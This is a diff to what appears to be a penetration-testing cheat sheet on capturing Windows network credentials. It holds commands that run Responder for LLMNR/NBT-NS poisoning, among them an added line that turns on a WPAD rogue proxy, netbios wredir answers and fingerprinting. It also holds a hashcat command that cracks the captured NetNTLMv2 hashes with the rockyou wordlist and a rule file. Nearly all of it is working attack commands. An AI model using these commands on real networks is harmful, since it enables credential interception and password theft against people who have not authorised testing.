@@ -97,6 +97,8 @@ python Responder.py -I eth0 -wdvb
 - found credentials use them for hashcat:
 hashcat -m 5600 resp.hashes -o resp.cracked /usr/share/wordlists/rockyou.txt -r /opt/OneRuleToRuleThemAll.rule --force
 - if you want to exclude your host IP, add in the Responder.conf under "Don't RespondTo= " the IP you want to exclude. You can also add the IPv6 IP address there as well.
+- Specify the IP address to redirect to (-i 192.168.1.202), enabling the WPAD rogue proxy (-w On), answers for netbios wredir (-r On), and fingerprinting (-f On):
+responder -i 192.168.1.202 -w On -r On -f On
 
 Cracking Responder Hashes with Hashcat:
 hashcat -m 5600 resp.hashes -o resp.cracked /usr/share/wordlists/rockyou.txt -r /opt/OneRuleToRuleThemAll.rule --force
